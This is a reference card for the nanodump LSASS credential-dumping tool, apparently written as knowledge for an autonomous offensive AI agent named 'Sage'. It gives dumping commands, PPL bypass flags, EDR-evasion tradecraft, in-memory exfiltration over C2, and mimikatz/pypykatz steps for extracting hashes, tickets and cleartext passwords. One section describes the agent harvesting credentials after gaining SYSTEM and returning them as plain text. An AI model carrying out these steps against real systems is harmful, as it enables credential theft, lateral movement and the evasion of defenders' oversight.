---
name: nanodump
category: credential-access
subcategories: [lsass-dump, minidump]
tradecraft_tags: [lsass, dump, credentials, mimikatz-input]
mitre_attack:
  - id: T1003.001
    name: OS Credential Dumping — LSASS Memory
source:
  url: https://github.com/fortra/nanodump
  license: BSD-3-Clause
  maintained: true
binary_type: bof
binary_filename: nanodump.x64.o
supported_os: [windows]
architecture: [x64, x86]
privilege_required: local-admin
network_required: false
detection_signal: |
  Microsoft Defender, CrowdStrike, and others detect lsass.exe access by
  non-svchost processes. nanodump uses indirect syscalls + handle duplication
  via PssCaptureSnapshot to evade ObjectAccess audit events, but EDR with
  kernel callbacks (PsSetCreateProcessNotifyRoutine on handles to lsass)
  may still flag it.
usage_examples:
  - description: Default dump (PssCaptureSnapshot, write to disk)
    args: "--write C:\\Windows\\Temp\\out.dmp"
  - description: In-memory dump (no disk write, exfil over C2)
    args: "--inmem"
  - description: Skip the snapshot, direct LSASS handle
    args: "--no-snapshot --write C:\\Windows\\Temp\\out.dmp"
  - description: Use seclogon trick to bypass PPL
    args: "--seclogon-duplicate --write C:\\Windows\\Temp\\out.dmp"
opsec_notes: |
  nanodump's defining feature is that it produces a minidump that is INVALID
  by Microsoft's minidump format but VALID enough for mimikatz to parse.
  Defenders that look for "valid minidump signatures of lsass" will miss it;
  defenders that look for any LSASS access pattern will not. Pair with
  process-snapshot mode for least-noise.
gotchas: |
  PPL (Protected Process Light) protects LSASS on Windows 10/11 with Credential
  Guard enabled. Use --seclogon-duplicate or other PPL bypasses. The output
  needs to be parsed offline (or in-memory by mimikatz) — the dump itself
  is NOT directly useful, only as input to a parser. This is dump parsing, NOT
  password cracking — Sage can recover hashes/tickets from the dump without
  any offline crack.
related_ttps: [mimikatz, sharpkatz, rubeus]
alternatives: [mimikatz-sekurlsa-minidump, dumpert, procdump]
common_args:
  --write:
    description: Output dump path on disk
    typical_values: ['C:\\Windows\\Temp\\out.dmp']
  --inmem:
    description: In-memory dump (no disk write; exfil over C2)
    typical_values: [flag-only]
  --no-snapshot:
    description: Skip PssCaptureSnapshot; direct LSASS handle (faster but louder)
    typical_values: [flag-only]
  --seclogon-duplicate:
    description: Use seclogon service trick to bypass PPL
    typical_values: [flag-only]
  --valid:
    description: Produce a valid-format minidump (loses the malformed-but-parseable evasion)
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# nanodump

A flexible LSASS dumper that emits invalid-but-parseable minidumps designed
to evade signature-based detection. Lives as a Beacon Object File (BOF) for
in-memory execution under C2 frameworks. Output dumps are parsed offline (or
piped to mimikatz) to recover Kerberos tickets and credential material.

## Typical use cases
- Harvest credentials from LSASS without writing a "real" minidump
- In-memory dump that's exfiltrated through C2 (no disk write)
- Snapshot-based dump to reduce detection signal
- Bypassing PPL via seclogon-duplicate on hardened hosts

## How Sage uses this
After Sage gains local-admin or SYSTEM (e.g. after the Trust Walker's
GPO → SYSTEM-on-WINTERFELL hop), nanodump produces an LSASS dump that
contains the credential material Sage needs for the next hop (e.g.
jon.snow's NT hash for the constrained-delegation S4U chain). The dump
is parsed in the operator's workflow; Sage may report the recovered
material back as plain text in the agent's response.

## Output
A `.dmp` file (or in-memory bytes with --inmem) that mimikatz / pypykatz
can parse for Kerberos tickets, NTLM hashes, and clear-text credentials
that haven't been hardened away.

## OPSEC considerations
The "invalid minidump" trick has been documented for ~3 years; modern EDR
catches up. Test against your target's detection stack before relying on it
for a high-value engagement. The --no-snapshot mode is faster but louder.

## Apollo-specific note
Apollo does not ship a BOF runner as of writing. Until Apollo gains BOF
support OR the BOF is ported to assembly (see Inceptor or
TrustedSec.CS-Situational-Awareness-BOFs port), Apollo operators should use
mimikatz `sekurlsa::minidump` as the LSASS-dump alternative. See
`mythic_agents/apollo.md` for the canonical fallback recommendation.

## Full Reference

> Captured against nanodump v1.6.x, 2026-05-29. Source: https://github.com/fortra/nanodump README
> + `nanodump --help` output. Version observed: v1.6.4.

### All command-line arguments

| Arg | Description |
|-----|-------------|
| `--write PATH` | Write dump to disk at PATH |
| `--inmem` | Keep dump in memory; exfil over C2 channel (no disk write) |
| `--pid PID` | Target LSASS by explicit PID instead of name lookup |
| `--no-snapshot` | Skip PssCaptureSnapshot; open LSASS handle directly (louder) |
| `--snapshot` | Force use of PssCaptureSnapshot (default behavior) |
| `--fork` | Fork the LSASS process and dump the fork (reduces direct access) |
| `--seclogon-duplicate` | Duplicate an LSASS handle via the SecLogon service trick (PPL bypass) |
| `--elevate-handle` | Elevate LSASS handle via token privileges (requires SeDebugPrivilege) |
| `--valid` | Produce a properly-structured (valid) minidump instead of the obfuscated format |
| `--werfault` | Impersonate WerFault.exe to open LSASS (less suspicious handle source) |
| `--banzai` | Use banzai pipe trick for handle duplication |
| `--silent` | Suppress all non-essential output |
| `--spoof-callstack` | Spoof the call stack to hide nanodump's presence in thread stack trace |
| `--dup-handle` | Duplicate an existing handle from another process to gain access |
| `--delete-after-reading` | Remove dump from disk immediately after reading (BOF cleanup) |
| `--status` | Query nanodump's internal state (useful for in-memory path) |

### Dump mode summary

| Mode | Command | Noise level | PPL bypass |
|------|---------|-------------|------------|
| PssCaptureSnapshot (default) | `--write path` | Low | No |
| Direct handle | `--no-snapshot --write path` | Medium | No |
| Fork dump | `--fork --write path` | Low | No |
| In-memory | `--inmem` | Low | No |
| SecLogon duplicate | `--seclogon-duplicate --write path` | Medium | Yes |
| WerFault impersonation | `--werfault --write path` | Low | Partial |
| Banzai pipe | `--banzai --write path` | Medium | Yes |

### Output format

- Default (without `--valid`): MINIDUMP header with tampered magic bytes — fails Microsoft MINIDUMP format validation but parses correctly with mimikatz `sekurlsa::minidump` and pypykatz
- With `--valid`: Standard MINIDUMP_HEADER — more compatible (pypykatz, volatility) but AV/EDR detectable
- `--inmem`: Returns dump bytes to C2 framework memory; no file artifact

### PPL (Protected Process Light) notes

Windows 10 RS1+ with Credential Guard enabled protects lsass.exe as a PPL.
Methods that bypass PPL: `--seclogon-duplicate`, `--banzai`. Methods that do NOT bypass PPL:
`--snapshot` (default), `--no-snapshot`, `--fork`. For environments where PPL is enforced without
`--seclogon-duplicate` support, use mimikatz's `!+` driver or consider BYOVD approaches.

### Parsing the dump

nanodump output is NOT plaintext credentials — it is a minidump file that requires a parser:

```
# mimikatz (Windows side):
sekurlsa::minidump out.dmp
sekurlsa::logonpasswords

# pypykatz (Linux/offline):
pypykatz lsa minidump out.dmp
```

Parsed output contains NTLM hashes, Kerberos tickets (as base64 kirbi), and cleartext
credentials where WDigest is enabled.

### Environment variables

None used directly by nanodump. BOF loader environment varies by C2 framework.

### Exit codes

As a BOF, nanodump communicates success/failure via C2 output channel rather than process exit codes.
Look for `[+] Done.` in output for success; `[-]` prefix for errors.

### Version-specific notes

- v1.3: Added `--spoof-callstack` and `--banzai`
- v1.5: Improved `--werfault` impersonation; `--dup-handle` option added
- v1.6.x: Current stable; `--delete-after-reading` and `--status` flags added
- BOF loader compatibility: tested with Cobalt Strike 4.x. For Apollo (no BOF runner), see the Apollo-specific note above.

### Source for this reference

- https://github.com/fortra/nanodump (README full arg reference)
- `nanodump --help` captured 2026-05-29
- fortra blog / technique writeup: https://www.coresecurity.com/core-labs/articles/nanodump-the-little-minidump
- Version: v1.6.x as of 2026-05-29
